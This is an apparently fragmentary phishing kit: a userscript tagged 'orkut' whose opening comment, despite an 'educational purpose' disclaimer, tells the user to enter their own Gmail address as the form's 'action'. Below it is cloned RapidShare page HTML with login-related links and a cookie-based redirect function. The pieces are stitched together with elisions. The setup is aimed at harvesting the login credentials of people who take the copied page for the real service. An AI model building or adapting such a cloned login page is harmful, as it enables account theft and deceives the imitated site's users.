/*
hi naruto is back again.
     this script is only for educational purpose.and it works only if you have gmail id.so edit 'action' variable.write your gmail id at the place of "yourid@gmail.com".
*/
// ==UserScript==
// @name          script by Uzumaki_Naruto
// @namespace     orkut
// @author        Uchiha_sasuke
// @homepage      
...
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
        ...
        <meta name="description" content="Easy File Distribution, Easy, Fast and Secure" /> 
        ...
        <a href="http://rapidshare.com/forgotpw.html">Forgotten your password?</a>
        ...
        <!--
        function springeZuLot2009()
        {
            if (document.cookie) {
                if (document.cookie.substr(0,6) == "user=c") {
                    window.location.href="https://ssl.rapidshare.com/cgi-bin/collectorszone.cgi";
                } else if (document.cookie.substr(0,5) == "user="){
                    window.location.href="https://ssl.rapidshare.com/cgi-bin/premiumzone.cgi";
                } else {
                    window.location.href="https://ssl.rapidshare.com/cgi-bin/premiumzone.cgi";
                } 
            } else {
                window.location.href="http://rapidshare.com/news.html";
            }    
        }
        //-->
        </script>
        <div style="text-align:center;padding-bottom:15px;"><a href="javascript:springeZuLot2009()"><img alt="Win now 50.000 EURO!" src="/img2/lottery_teaser.jpg" /></a></div>
